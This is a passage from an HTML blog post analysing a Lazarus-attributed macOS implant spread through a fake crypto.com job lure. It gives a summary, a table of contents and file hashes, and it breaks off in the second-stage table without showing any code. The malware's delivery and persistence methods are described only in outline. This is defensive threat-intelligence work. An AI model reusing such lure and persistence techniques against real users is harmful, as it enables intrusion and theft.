@@ -1,0 +1,1501 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Crypto Workers Wanted &middot; alden.io</title>
+  <meta name="title" content="Crypto Workers Wanted &middot; alden.io" />
+  
+  <meta name="description" content="An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus&#39; Operation Interception." />
+  <meta name="keywords" content="Lazarus, Malware, RE, CTI, North Korea, macOS, " />
+  
+  
+  <link rel="canonical" href="https://alden.io/posts/crypto-workers-wanted/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.f56c12357bf813386ed76f52a51a90540cbc514e2b1d521cd87df1f259e1c6c1680e8e597951f480b04a3959198916e65c33a2c44717ecea1d3a4386e60a483d.css"
+    integrity="sha512-9WwSNXv4Ezhu129SpRqQVAy8UU4rHVIc2H3x8lnhxsFoDo5ZeVH0gLBKOVkZiRbmXDOixEcX7OodOkOG5gpIPQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.0c2efa25b877bbb1cbe22c984957864f28de3072dda887632dd30d5e82bedd61a9cc3e2e996c81d9da4acbee3d4aee6b45d4a339fa66ee22f518123eb89a1b2a.js"
+    integrity="sha512-DC76Jbh3u7HL4iyYSVeGTyjeMHLdqIdjLdMNXoK&#43;3WGpzD4umWyB2dpKy&#43;49Su5rRdSjOfpm7iL1GBI&#43;uJobKg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js"
+    integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ&#43;dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5&#43;a8AgFUkA==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Crypto Workers Wanted" />
+<meta property="og:description" content="An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus&#39; Operation Interception." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://alden.io/posts/crypto-workers-wanted/" /><meta property="og:image" content="https://alden.io/posts/crypto-workers-wanted/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-05-13T17:51:24-05:00" />
+<meta property="article:modified_time" content="2023-05-13T17:51:24-05:00" /><meta property="og:site_name" content="alden.io" />
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://alden.io/posts/crypto-workers-wanted/featured.png"/>
+<meta name="twitter:title" content="Crypto Workers Wanted"/>
+<meta name="twitter:description" content="An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus&#39; Operation Interception."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Crypto Workers Wanted",
+    "headline": "Crypto Workers Wanted",
+    "description": "An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus\u0027 Operation Interception.",
+    "abstract": "An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus\u0026rsquo; Operation Interception.",
+    "inLanguage": "en",
+    "url" : "https:\/\/alden.io\/posts\/crypto-workers-wanted\/",
+    "author" : {
+      "@type": "Person",
+      "name": "alden"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-05-13T17:51:24-05:00",
+    "datePublished": "2023-05-13T17:51:24-05:00",
+    
+    "dateModified": "2023-05-13T17:51:24-05:00",
+    
+    "keywords": ["Lazarus","Malware","RE","CTI","North Korea","macOS"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1670"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="alden" />
+  
+  
+  
+  <link href="https://github.com/ald3ns" rel="me" />
+  
+  
+  <link href="https://keybase.io/birchboy" rel="me" />
+  
+  
+  <link href="https://infosec.exchange/@birch" rel="me" />
+  
+  
+  <link href="https://twitter.com/birchb0y" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">alden.io</a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/posts/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
+        blog
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About">
+        about
+    </p>
+</a>
+
+
+            
+            
+  <a href="/tags/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Tags">
+        tags
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Posts">
+            blog
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About">
+            about
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tags/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Tags">
+            tags
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+        
+        <img class="w-full rounded-lg single_hero_round nozoom" alt="Crypto Workers Wanted" width="1200" height="800" src="/posts/crypto-workers-wanted/featured_hu6f590e5957d53c2fa3d19087798abf46_1985142_1200x0_resize_box_3.png">
+        
+    
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/crypto-workers-wanted/"
+      >Crypto Workers Wanted</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Crypto Workers Wanted
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2023-05-13 17:51:24 -0500 -0500">13 May 2023</time><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="#/posts/crypto-workers-wanted/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+
+  </span>
+
+</span></a
+  >
+</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/lazarus/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Lazarus
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/malware/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Malware
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/re/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    RE
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cti/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    CTI
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/north-korea/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    North Korea
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/macos/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    macOS
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+  </header>
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+     <div
+      class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky  lg:top-10 ">
+
+         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0-summary">0. Summary</a></li>
+    <li><a href="#1-first-stage">1. First Stage</a></li>
+    <li><a href="#2-second-stage">2. Second Stage</a>
+      <ul>
+        <li><a href="#21---preliminary-analysis">2.1 - Preliminary Analysis</a></li>
+        <li><a href="#22---static-analysis">2.2 - Static Analysis</a>
+          <ul>
+            <li><a href="#221---main">2.2.1 - Main</a></li>
+            <li><a href="#222---killswitch">2.2.2 - Killswitch</a></li>
+            <li><a href="#223---thexec">2.2.3 - <code>thExec()</code></a></li>
+            <li><a href="#224---persistence">2.2.4 - Persistence</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-third-stage">3. Third Stage</a>
+      <ul>
+        <li><a href="#31---preliminary-analysis">3.1 - Preliminary Analysis</a></li>
+        <li><a href="#32---static-analysis">3.2 - Static Analysis</a>
+          <ul>
+            <li><a href="#321---main">3.2.1 - Main</a></li>
+            <li><a href="#322---download-file">3.2.2 - Download File</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-infrastructure-analysis">4. Infrastructure Analysis</a></li>
+    <li><a href="#5-appendix">5. Appendix</a>
+      <ul>
+        <li><a href="#51---yara-rules">5.1 - YARA Rules</a></li>
+        <li><a href="#52---iocs">5.2 - IOCs</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0-summary">0. Summary</a></li>
+    <li><a href="#1-first-stage">1. First Stage</a></li>
+    <li><a href="#2-second-stage">2. Second Stage</a>
+      <ul>
+        <li><a href="#21---preliminary-analysis">2.1 - Preliminary Analysis</a></li>
+        <li><a href="#22---static-analysis">2.2 - Static Analysis</a>
+          <ul>
+            <li><a href="#221---main">2.2.1 - Main</a></li>
+            <li><a href="#222---killswitch">2.2.2 - Killswitch</a></li>
+            <li><a href="#223---thexec">2.2.3 - <code>thExec()</code></a></li>
+            <li><a href="#224---persistence">2.2.4 - Persistence</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-third-stage">3. Third Stage</a>
+      <ul>
+        <li><a href="#31---preliminary-analysis">3.1 - Preliminary Analysis</a></li>
+        <li><a href="#32---static-analysis">3.2 - Static Analysis</a>
+          <ul>
+            <li><a href="#321---main">3.2.1 - Main</a></li>
+            <li><a href="#322---download-file">3.2.2 - Download File</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-infrastructure-analysis">4. Infrastructure Analysis</a></li>
+    <li><a href="#5-appendix">5. Appendix</a>
+      <ul>
+        <li><a href="#51---yara-rules">5.1 - YARA Rules</a></li>
+        <li><a href="#52---iocs">5.2 - IOCs</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+   </div>
+      </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        
+
+        <div id="0-summary" class="anchor"></div>
+<h2 class="relative group">0. Summary 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#0-summary" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>This post is an analysis of a previously unreported macOS implant which appears to be part of Lazarus&rsquo; &ldquo;Operation In(ter)ception&rdquo; that was <a href="https://www.sentinelone.com/blog/lazarus-operation-interception-targets-macos-users-dreaming-of-jobs-in-crypto/"   target="_blank">
+    analyzed by SentinelOne</a> in September 2022. This particular sample was uploaded to <a href="https://www.virustotal.com/gui/file/8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0/relations"   target="_blank">
+    VirusTotal</a> on Janurary 26, 2023 and has a number of similarites to the previously analyzed example.</p>
+<p>This follows several high profile and prominent campaigns by North Korean actors involving the macOS platform. The most notable being the <a href="https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"   target="_blank">
+    3CX supply-chain</a> attack, which was found to have a macOS component (Partick Wardle did a fantastic <a href="https://objective-see.org/blog/blog_0x73.html"   target="_blank">
+    analysis</a>). JAMF also recently reported on some new Mac malware called <a href="https://www.jamf.com/blog/bluenoroff-apt-targets-macos-rustbucket-malware/"   target="_blank">
+    RustBucket</a>, which is also attributed to North Korean threat actors.</p>
+<p>This malware is delivered under the guise of a crypto.com job posting and has at least 3 stages. It establishes persistence using a LaunchDaemon and is capable of downloading and running further malware from a C2 server.</p>
+<p>All of the decompiled code, YARA rules, and Binary Ninja databases can be found on my <a href="https://github.com/ald3ns"   target="_blank">
+    Github</a>.</p>
+<div id="1-first-stage" class="anchor"></div>
+<h2 class="relative group">1. First Stage 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#1-first-stage" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<table>
+<thead>
+<tr>
+<th>Trait</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>CryptoComJD.zip</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>f764c707500e7a54db9830741d3a36bf</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>f2edce988fda14e3c113eb1ef020e8a7f15e371d</td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td>a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec</td>
+</tr>
+</tbody>
+</table>
+<p>The malware was delivered in a file called <code>CryptoComJD.zip</code> - the distribution method is unknown at this time. The PDF included in the ZIP is actually part of the first stage executable and is opened during runtime. It is 25 pages long and contains a number of crypto related job descriptions. It is the same lure that was used in the Operation In(ter)ception report.
+
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /posts/crypto-workers-wanted/img/lure-pdf_hud78a3d8bc57e33b787a0ec21efe22137_1129762_330x0_resize_box_3.png 330w,
+        /posts/crypto-workers-wanted/img/lure-pdf_hud78a3d8bc57e33b787a0ec21efe22137_1129762_660x0_resize_box_3.png 660w,
+        /posts/crypto-workers-wanted/img/lure-pdf_hud78a3d8bc57e33b787a0ec21efe22137_1129762_1024x0_resize_box_3.png 1024w,
+        /posts/crypto-workers-wanted/img/lure-pdf_hud78a3d8bc57e33b787a0ec21efe22137_1129762_1320x0_resize_box_3.png 2x"
+        src="/posts/crypto-workers-wanted/img/lure-pdf_hud78a3d8bc57e33b787a0ec21efe22137_1129762_660x0_resize_box_3.png"
+        alt="lure-pdf.png"
+      />
+      
+      <figcaption>Fig 1: PDF Job Lure</figcaption>
+    </figure>
+  
+
+</p>
+<div id="2-second-stage" class="anchor"></div>
+<h2 class="relative group">2. Second Stage 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#2-second-stage" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<table>
+<thead>
+<tr>
+<th>Trait</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>CryptoComJobOpportunities.pdf</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>d1c064a698dc3b3414313d9f9e33b73b</td>
+</tr>
+<tr>
+<td>SHA-1</td>
